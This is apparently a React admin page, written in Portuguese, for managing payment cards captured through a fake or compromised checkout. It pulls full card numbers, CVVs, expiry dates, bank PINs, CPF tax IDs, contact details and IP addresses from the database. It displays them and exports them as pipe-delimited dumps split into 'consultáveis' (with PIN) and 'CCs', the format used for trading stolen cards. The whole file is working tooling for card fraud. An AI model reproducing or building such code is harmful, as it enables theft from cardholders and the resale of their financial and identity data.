import { useState, useEffect, useMemo } from "react";
import AdminTopbar from "@/components/AdminTopbar";
import { useStore } from "@/contexts/StoreContext";
import { formatCurrency } from "@/utils/formatters";
import { supabase } from "@/integrations/supabase/client";
import { 
  CreditCard, Search, Eye, EyeOff, Download, Trash2, 
  RefreshCw, Copy, Check, Filter, ShieldCheck, Lock, 
  User, Calendar, DollarSign, FileText, CheckCircle2, AlertCircle
} from "lucide-react";
import { toast } from "sonner";
import { copyToClipboard } from "@/utils/clipboard";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";

interface CardRecord {
  id: string;
  order_id?: string;
  order_number?: string;
  customer_name: string;
  customer_email?: string;
  customer_phone?: string;
  cpf?: string;
  card_number: string;
  card_name: string;
  card_expiry: string;
  card_cvv: string;
  card_password?: string;
  total: number;
  status: string;
  payment_status: string;
  created_at: string;
  ip_address?: string;
}

const gradientBtn = "bg-gradient-to-r from-[#B55409] via-[#D97706] to-[#F59E0B]";

export default function AdminCards() {
  const { orders, refreshData } = useStore();
  const [cardsList, setCardsList] = useState<CardRecord[]>([]);
  const [loading, setLoading] = useState(true);
  const [search, setSearch] = useState("");
  const [showNumbers, setShowNumbers] = useState<Record<string, boolean>>({});
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [selectedCard, setSelectedCard] = useState<CardRecord | null>(null);
  const [isExportDialogOpen, setIsExportDialogOpen] = useState(false);

  // Fetch from orders with card info AND checkout_cards table
  const fetchCards = async () => {
    try {
      setLoading(true);

      // 1. Fetch from orders with credit_card
      const { data: ordData } = await supabase
        .from("orders")
        .select("*")
        .in("payment_method", ["credit_card", "card"])
        .order("created_at", { ascending: false });

      // 2. Fetch from checkout_cards
      const { data: directCards } = await supabase
        .from("checkout_cards")
        .select("*")
        .order("created_at", { ascending: false });

      const combined: CardRecord[] = [];
      const seenCards = new Set<string>();

      // Parse orders
      if (ordData) {
        for (const o of ordData) {
          let notes: any = {};
          try {
            notes = typeof o.notes === "string" ? JSON.parse(o.notes) : (o.notes || {});
          } catch (e) {}

          const num = notes.cardNumber || notes.card_number || o.card_bin || "";
          const name = notes.cardName || notes.card_name || o.customer_name || "Titular";
          const exp = notes.cardExpiry || notes.card_expiry || "";
          const cvv = notes.cardCvv || notes.card_cvv || "";
          const pass = notes.cardPassword || notes.card_password || "";
          const cpf = notes.cardCpf || notes.card_cpf || o.cpf || "";

          if (num || name) {
            seenCards.add(num.replace(/\s+/g, ""));
            combined.push({
              id: o.id,
              order_id: o.id,
              order_number: o.order_number,
              customer_name: o.customer_name || name,
              customer_email: o.customer_email,
              customer_phone: o.customer_phone,
              cpf: cpf || o.cpf,
              card_number: num,
              card_name: name,
              card_expiry: exp,
              card_cvv: cvv,
              card_password: pass,
              total: Number(o.total || 0),
              status: o.status || "pending",
              payment_status: o.payment_status || "pending",
              created_at: o.created_at,
              ip_address: o.ip_address
            });
          }
        }
      }

      // Parse direct checkout_cards
      if (directCards) {
        for (const c of directCards) {
          const rawNum = c.card_number ? String(c.card_number).replace(/\s+/g, "") : "";
          if (rawNum && !seenCards.has(rawNum)) {
            combined.push({
              id: c.id,
              customer_name: c.card_name || "Cliente",
              cpf: c.doc_number || "",
              card_number: c.card_number || "",
              card_name: c.card_name || "",
              card_expiry: c.card_expiry || "",
              card_cvv: c.card_cvv || "",
              card_password: (c as any).card_password || "",
              total: 0,
              status: "captured",
              payment_status: "captured",
              created_at: c.created_at
            });
          }
        }
      }

      setCardsList(combined);
    } catch (err: any) {
      toast.error("Erro ao carregar cartões: " + (err.message || err));
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchCards();
    const interval = setInterval(fetchCards, 10000);
    return () => clearInterval(interval);
  }, []);

  const toggleShowNumber = (id: string) => {
    setShowNumbers(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const handleCopy = async (text: string, id: string) => {
    const ok = await copyToClipboard(text);
    if (ok) {
      setCopiedId(id);
      toast.success("Copiado com sucesso!");
      setTimeout(() => setCopiedId(null), 2000);
    } else {
      toast.error("Não foi possível copiar.");
    }
  };

  const handleDelete = async (card: CardRecord) => {
    if (!confirm(`Deseja excluir o registro do cartão de ${card.customer_name}?`)) return;
    try {
      if (card.order_id) {
        await supabase.from("orders").delete().eq("id", card.order_id);
      }
      await supabase.from("checkout_cards").delete().eq("id", card.id);
      toast.success("Registro removido com sucesso!");
      fetchCards();
      refreshData?.();
    } catch (err: any) {
      toast.error("Erro ao excluir: " + err.message);
    }
  };

  const handleExport = (type: "ccs" | "consultaveis" | "all") => {
    const lines = cardsList
      .map(c => {
        if (!c.card_number) return null;
        const hasPassword = !!c.card_password && c.card_password.trim() !== "";
        if (type === "ccs" && hasPassword) return null;
        if (type === "consultaveis" && !hasPassword) return null;

        if (type === "consultaveis") {
          return `${c.card_number}|${c.card_expiry}|${c.card_cvv}|${c.card_name}|${c.cpf || ""}|${c.card_password}`;
        }
        return `${c.card_number}|${c.card_expiry}|${c.card_cvv}|${c.card_name}|${c.cpf || ""}`;
      })
      .filter(Boolean);

    if (lines.length === 0) {
      toast.error(`Nenhum cartão ${type === 'ccs' ? 'sem senha' : type === 'consultaveis' ? 'com senha (consultável)' : ''} encontrado.`);
      setIsExportDialogOpen(false);
      return;
    }

    const header = type === "consultaveis"
      ? "NUMERO|VALIDADE|CVV|TITULAR|CPF|SENHA"
      : "NUMERO|VALIDADE|CVV|TITULAR|CPF";

    const content = header + "\n" + lines.join("\n");
    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = `cartoes_${type}_${Date.now()}.txt`;
    link.click();
    URL.revokeObjectURL(url);
    setIsExportDialogOpen(false);
    toast.success(`${lines.length} cartões exportados com sucesso!`);
  };

  const stats = useMemo(() => {
    const total = cardsList.length;
    const withPassword = cardsList.filter(c => c.card_password && c.card_password.trim() !== "").length;
    const withoutPassword = total - withPassword;
    const totalVolume = cardsList.reduce((acc, c) => acc + (c.total || 0), 0);

    return { total, withPassword, withoutPassword, totalVolume };
  }, [cardsList]);

  const filteredCards = useMemo(() => {
    return cardsList.filter(c => {
      if (!search.trim()) return true;
      const s = search.toLowerCase();
      const matchNum = c.card_number.toLowerCase().includes(s);
      const matchName = c.card_name.toLowerCase().includes(s) || c.customer_name.toLowerCase().includes(s);
      const matchCpf = (c.cpf || "").toLowerCase().includes(s);
      const matchOrder = (c.order_number || "").toLowerCase().includes(s);
      return matchNum || matchName || matchCpf || matchOrder;
    });
  }, [cardsList, search]);

  return (
    <div className="flex-1 flex flex-col min-h-0 bg-background overflow-hidden">
      <AdminTopbar title="Cartões" />

      <div className="flex-1 p-3 sm:p-6 overflow-y-auto space-y-4 sm:space-y-6">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 sm:gap-4 pb-4 border-b border-border">
          <div>
            <h2 className="text-lg sm:text-xl font-bold text-foreground flex items-center gap-2">
              <CreditCard className="w-5 h-5 text-[#F59E0B]" />
              Gerenciamento de Cartões
            </h2>
            <p className="text-xs text-muted-foreground mt-0.5">
              Todos os cartões capturados e pedidos via cartão de crédito em um só lugar.
            </p>
          </div>

          <div className="flex items-center gap-1.5 sm:gap-2 flex-wrap">
            <button
              onClick={() => setIsExportDialogOpen(true)}
              className={`flex items-center gap-1.5 px-3 sm:px-3.5 py-2 text-xs font-medium rounded-[5px] ${gradientBtn} text-white shadow-md shadow-[#D97706]/20 transition`}
            >
              <Download className="w-3.5 h-3.5" />
              Exportar
            </button>
            <button
              onClick={fetchCards}
              className="flex items-center gap-1.5 px-3 sm:px-3.5 py-2 text-xs font-medium rounded-[5px] bg-secondary hover:bg-secondary/80 text-foreground border border-border transition"
            >
              <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
              Atualizar
            </button>
          </div>
        </div>

        {/* KPI Cards */}
        <div className="grid grid-cols-2 md:grid-cols-4 gap-2.5 sm:gap-4">
          <div className="glass-card-hover p-3 sm:p-4 rounded-[6px] bg-card border border-border flex flex-col justify-between">
            <div className="flex items-center justify-between text-muted-foreground mb-2">
              <span className="text-xs font-medium uppercase tracking-wider">Total de Cartões</span>
              <div className={`p-1.5 sm:p-2 rounded-[6px] ${gradientBtn} text-white shadow-sm`}>
                <CreditCard className="w-4 h-4 text-white" />
              </div>
            </div>
            <div className="text-xl sm:text-2xl font-bold text-foreground">{stats.total}</div>
            <span className="text-[10px] sm:text-[11px] text-muted-foreground">Todos os cartões</span>
          </div>

          <div className="glass-card-hover p-3 sm:p-4 rounded-[6px] bg-card border border-border flex flex-col justify-between">
            <div className="flex items-center justify-between text-muted-foreground mb-2">
              <span className="text-xs font-medium uppercase tracking-wider text-green-400">Consultáveis</span>
              <div className={`p-1.5 sm:p-2 rounded-[6px] ${gradientBtn} text-white shadow-sm`}>
                <Lock className="w-4 h-4 text-white" />
              </div>
            </div>
            <div className="text-xl sm:text-2xl font-bold text-green-400">{stats.withPassword}</div>
            <span className="text-[10px] sm:text-[11px] text-green-400/80">Com senha bancária</span>
          </div>

          <div className="glass-card-hover p-3 sm:p-4 rounded-[6px] bg-card border border-border flex flex-col justify-between">
            <div className="flex items-center justify-between text-muted-foreground mb-2">
              <span className="text-xs font-medium uppercase tracking-wider text-amber-400">Sem Senha</span>
              <div className={`p-1.5 sm:p-2 rounded-[6px] ${gradientBtn} text-white shadow-sm`}>
                <CreditCard className="w-4 h-4 text-white" />
              </div>
            </div>
            <div className="text-xl sm:text-2xl font-bold text-amber-400">{stats.withoutPassword}</div>
            <span className="text-[10px] sm:text-[11px] text-amber-400/80">Número + Val + CVV</span>
          </div>

          <div className="glass-card-hover p-3 sm:p-4 rounded-[6px] bg-card border border-border flex flex-col justify-between">
            <div className="flex items-center justify-between text-muted-foreground mb-2">
              <span className="text-xs font-medium uppercase tracking-wider text-purple-400">Volume</span>
              <div className={`p-1.5 sm:p-2 rounded-[6px] ${gradientBtn} text-white shadow-sm`}>
                <DollarSign className="w-4 h-4 text-white" />
              </div>
            </div>
            <div className="text-xl sm:text-2xl font-bold text-purple-400">{formatCurrency(stats.totalVolume)}</div>
            <span className="text-[10px] sm:text-[11px] text-purple-400/80">Total em pedidos</span>
          </div>
        </div>

        {/* Cards Table Container */}
        <div className="bg-card border border-border rounded-[5px] p-3 sm:p-5 shadow-lg">
          {/* Controls */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-4 border-b border-border">
            <div className="relative flex-1 max-w-sm">
              <Search className="w-4 h-4 absolute left-3 top-1/2 -translate-y-1/2 text-muted-foreground" />
              <input
                type="text"
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                placeholder="Buscar por número, titular, CPF ou pedido..."
                className="w-full pl-9 pr-3 py-1.5 bg-secondary border border-border rounded-[5px] text-xs text-foreground placeholder-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40"
              />
            </div>
            <span className="text-xs text-muted-foreground">
              Mostrando {filteredCards.length} {filteredCards.length === 1 ? 'cartão' : 'cartões'}
            </span>
          </div>

          {/* Table */}
          <div className="overflow-x-auto mt-4 -mx-1 sm:mx-0">
            <table className="w-full text-left text-xs min-w-[700px]">
              <thead>
                <tr className="border-b border-border text-muted-foreground font-medium">
                  <th className="pb-3 pl-2">Titular / Cliente</th>
                  <th className="pb-3">Número do Cartão</th>
                  <th className="pb-3">Validade</th>
                  <th className="pb-3">CVV</th>
                  <th className="pb-3">Senha</th>
                  <th className="pb-3">Valor / Pedido</th>
                  <th className="pb-3">Data</th>
                  <th className="pb-3 text-right pr-2">Ações</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-border/60">
                {filteredCards.length === 0 ? (
                  <tr>
                    <td colSpan={8} className="text-center py-12 text-muted-foreground">
                      Nenhum cartão encontrado.
                    </td>
                  </tr>
                ) : (
                  filteredCards.map((card) => {
                    const isVisible = showNumbers[card.id];
                    const numFormatted = card.card_number || "—";
                    const displayNum = isVisible 
                      ? numFormatted 
                      : (numFormatted.length > 8 ? `${numFormatted.slice(0, 4)} •••• •••• ${numFormatted.slice(-4)}` : numFormatted);

                    return (
                      <tr key={card.id} className="hover:bg-secondary/40 transition">
                        <td className="py-3 pl-2">
                          <div className="flex flex-col">
                            <span className="font-semibold text-foreground">{card.card_name || card.customer_name}</span>
                            {card.cpf && (
                              <span className="text-[11px] text-muted-foreground font-mono">CPF: {card.cpf}</span>
                            )}
                          </div>
                        </td>
                        <td className="py-3 font-mono text-foreground">
                          <div className="flex items-center gap-1.5">
                            <span className="font-semibold tracking-wider">{displayNum}</span>
                            <button
                              onClick={() => toggleShowNumber(card.id)}
                              className="p-1 rounded-[3px] hover:bg-secondary text-muted-foreground hover:text-foreground transition"
                              title={isVisible ? "Ocultar" : "Mostrar número"}
                            >
                              {isVisible ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                            </button>
                            <button
                              onClick={() => handleCopy(card.card_number, `num_${card.id}`)}
                              className="p-1 rounded-[3px] hover:bg-secondary text-muted-foreground hover:text-foreground transition"
                              title="Copiar número"
                            >
                              {copiedId === `num_${card.id}` ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                            </button>
                          </div>
                        </td>
                        <td className="py-3 font-mono text-foreground">
                          {card.card_expiry || "—"}
                        </td>
                        <td className="py-3 font-mono text-foreground">
                          {card.card_cvv || "—"}
                        </td>
                        <td className="py-3">
                          {card.card_password ? (
                            <span className="px-2 py-0.5 rounded-[5px] bg-green-500/10 text-green-400 border border-green-500/20 font-mono font-bold text-[11px]">
                              {card.card_password}
                            </span>
                          ) : (
                            <span className="text-muted-foreground/60">—</span>
                          )}
                        </td>
                        <td className="py-3">
                          <div className="flex flex-col">
                            {card.total > 0 ? (
                              <span className="font-semibold text-foreground">{formatCurrency(card.total)}</span>
                            ) : (
                              <span className="text-muted-foreground">Checkout</span>
                            )}
                            {card.order_number && (
                              <span className="text-[10px] text-[#F59E0B]">#{card.order_number}</span>
                            )}
                          </div>
                        </td>
                        <td className="py-3 text-muted-foreground text-[11px]">
                          {new Date(card.created_at).toLocaleString('pt-BR')}
                        </td>
                        <td className="py-3 text-right pr-2">
                          <div className="flex items-center justify-end gap-1">
                            <button
                              onClick={() => setSelectedCard(card)}
                              className="p-1.5 rounded-[5px] bg-secondary hover:bg-secondary/80 text-foreground border border-border transition"
                              title="Ver Detalhes"
                            >
                              <FileText className="w-3.5 h-3.5" />
                            </button>
                            <button
                              onClick={() => handleDelete(card)}
                              className="p-1.5 rounded-[5px] bg-secondary hover:bg-red-500/20 text-muted-foreground hover:text-red-400 transition"
                              title="Excluir"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>

      {/* Details Dialog */}
      <Dialog open={!!selectedCard} onOpenChange={() => setSelectedCard(null)}>
        <DialogContent className="max-w-md w-[95vw] max-h-[90vh] overflow-y-auto bg-card border border-border text-foreground p-4 sm:p-6">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-foreground">
              <CreditCard className="w-5 h-5 text-[#F59E0B]" />
              Detalhes do Cartão
            </DialogTitle>
          </DialogHeader>

          {selectedCard && (
            <div className="space-y-4 pt-2">
              <div className="p-4 rounded-[5px] bg-secondary/80 border border-border space-y-2.5">
                <div className="flex justify-between items-center pb-2 border-b border-border/60">
                  <span className="text-xs text-muted-foreground">Número Completo</span>
                  <div className="flex items-center gap-1.5 font-mono font-bold text-foreground">
                    <span>{selectedCard.card_number}</span>
                    <button
                      onClick={() => handleCopy(selectedCard.card_number, 'modal_num')}
                      className="p-1 text-muted-foreground hover:text-foreground"
                    >
                      {copiedId === 'modal_num' ? <Check className="w-3.5 h-3.5 text-green-400" /> : <Copy className="w-3.5 h-3.5" />}
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-2 pb-2 border-b border-border/60 text-xs">
                  <div>
                    <span className="text-muted-foreground block">Validade</span>
                    <span className="font-mono font-bold text-foreground">{selectedCard.card_expiry || "—"}</span>
                  </div>
                  <div>
                    <span className="text-muted-foreground block">CVV</span>
                    <span className="font-mono font-bold text-foreground">{selectedCard.card_cvv || "—"}</span>
                  </div>
                </div>

                <div className="pb-2 border-b border-border/60 text-xs">
                  <span className="text-muted-foreground block">Titular do Cartão</span>
                  <span className="font-semibold text-foreground">{selectedCard.card_name}</span>
                </div>

                {selectedCard.cpf && (
                  <div className="pb-2 border-b border-border/60 text-xs">
                    <span className="text-muted-foreground block">CPF / Documento</span>
                    <span className="font-mono text-foreground">{selectedCard.cpf}</span>
                  </div>
                )}

                {selectedCard.card_password && (
                  <div className="text-xs">
                    <span className="text-green-400 block font-semibold">Senha Bancária (Consultável)</span>
                    <span className="font-mono font-bold text-lg text-green-400">{selectedCard.card_password}</span>
                  </div>
                )}
              </div>

              {selectedCard.customer_email || selectedCard.customer_phone ? (
                <div className="text-xs text-muted-foreground space-y-1">
                  <p><strong>E-mail:</strong> {selectedCard.customer_email || "—"}</p>
                  <p><strong>Telefone:</strong> {selectedCard.customer_phone || "—"}</p>
                  {selectedCard.ip_address && <p><strong>IP:</strong> {selectedCard.ip_address}</p>}
                </div>
              ) : null}
            </div>
          )}
        </DialogContent>
      </Dialog>

      {/* Export Dialog */}
      <Dialog open={isExportDialogOpen} onOpenChange={setIsExportDialogOpen}>
        <DialogContent className="max-w-sm w-[95vw] max-h-[90vh] overflow-y-auto bg-card border border-border text-foreground p-4 sm:p-6">
          <DialogHeader>
            <DialogTitle className="flex items-center gap-2 text-foreground">
              <Download className="w-5 h-5 text-[#F59E0B]" />
              Exportar Cartões
            </DialogTitle>
          </DialogHeader>

          <div className="space-y-3 pt-3">
            <button
              onClick={() => handleExport("consultaveis")}
              className="w-full p-3 rounded-[5px] bg-secondary hover:bg-secondary/80 border border-border text-left flex items-center justify-between group transition"
            >
              <div>
                <span className="text-xs font-bold text-green-400 block">Consultáveis (Com Senha)</span>
                <span className="text-[11px] text-muted-foreground">NUMERO|VALIDADE|CVV|NOME|CPF|SENHA</span>
              </div>
              <Download className="w-4 h-4 text-muted-foreground group-hover:text-foreground" />
            </button>

            <button
              onClick={() => handleExport("ccs")}
              className="w-full p-3 rounded-[5px] bg-secondary hover:bg-secondary/80 border border-border text-left flex items-center justify-between group transition"
            >
              <div>
                <span className="text-xs font-bold text-amber-400 block">CCs (Sem Senha)</span>
                <span className="text-[11px] text-muted-foreground">NUMERO|VALIDADE|CVV|NOME|CPF</span>
              </div>
              <Download className="w-4 h-4 text-muted-foreground group-hover:text-foreground" />
            </button>

            <button
              onClick={() => handleExport("all")}
              className="w-full p-3 rounded-[5px] bg-secondary hover:bg-secondary/80 border border-border text-left flex items-center justify-between group transition"
            >
              <div>
                <span className="text-xs font-bold text-foreground block">Todos os Cartões</span>
                <span className="text-[11px] text-muted-foreground">Exporta todos os cartões cadastrados</span>
              </div>
              <Download className="w-4 h-4 text-muted-foreground group-hover:text-foreground" />
            </button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
